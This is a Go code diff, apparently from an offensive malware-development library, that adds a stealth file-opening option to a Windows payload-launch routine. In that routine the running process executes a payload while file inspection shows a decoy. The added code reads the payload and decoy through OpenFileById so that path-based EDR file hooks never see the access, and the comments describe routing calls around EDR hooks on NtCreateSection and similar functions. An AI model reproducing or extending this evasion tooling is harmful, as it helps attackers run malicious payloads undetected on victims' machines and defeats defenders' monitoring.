@@ -11,6 +11,7 @@ import (
 
 	"golang.org/x/sys/windows"
 
+	"github.com/oioio-space/maldev/evasion/stealthopen"
 	"github.com/oioio-space/maldev/win/api"
 	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
@@ -41,6 +42,13 @@ type Config struct {
 	// EDR hooks on NtCreateSection, NtCreateProcessEx, NtCreateThreadEx, etc.
 	// nil = standard WinAPI (LazyProc.Call).
 	Caller *wsyscall.Caller
+
+	// Opener routes the payload + decoy reads through a stealth strategy
+	// (typically *stealthopen.Stealth built for PayloadPath/DecoyPath) so
+	// path-based EDR file hooks never observe the open. nil = standard
+	// os.Open path read. The target-file create (CREATE_ALWAYS write) is
+	// unchanged — the opener is a read-only abstraction.
+	Opener stealthopen.Opener
 }
 
 // ntCall routes a call through the Caller if set, otherwise via api.ProcXxx.Call.
@@ -53,6 +61,18 @@ func ntCall(caller *wsyscall.Caller, name string, proc *windows.LazyProc, args .
 		return r, fmt.Errorf("%s: NTSTATUS 0x%08X", name, uint32(r))
 	}
 	return 0, nil
+}
+
+// readAll opens path through opener and reads it to completion. Replaces
+// os.ReadFile so the Opener strategy (Standard = os.Open, Stealth =
+// OpenFileById) is honored transparently.
+func readAll(opener stealthopen.Opener, path string) ([]byte, error) {
+	f, err := opener.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer f.Close()
+	return io.ReadAll(f)
 }
 
 // processBasicInfo mirrors PROCESS_BASIC_INFORMATION.
@@ -111,8 +131,10 @@ type rtlUserProcessParameters struct {
 // The running process executes the original payload from kernel cache,
 // while any file inspection shows the decoy content.
 func Run(cfg Config) error {
-	// Read payload
-	payload, err := os.ReadFile(cfg.PayloadPath)
+	opener := stealthopen.Use(cfg.Opener)
+
+	// Read payload (via Opener — stealth or standard)
+	payload, err := readAll(opener, cfg.PayloadPath)
 	if err != nil {
 		return fmt.Errorf("read payload: %w", err)
 	}
@@ -200,7 +222,7 @@ func Run(cfg Config) error {
 
 	var decoyData []byte
 	if cfg.DecoyPath != "" {
-		decoyData, err = os.ReadFile(cfg.DecoyPath)
+		decoyData, err = readAll(opener, cfg.DecoyPath)
 		if err != nil {
 			return fmt.Errorf("read decoy: %w", err)
 		}
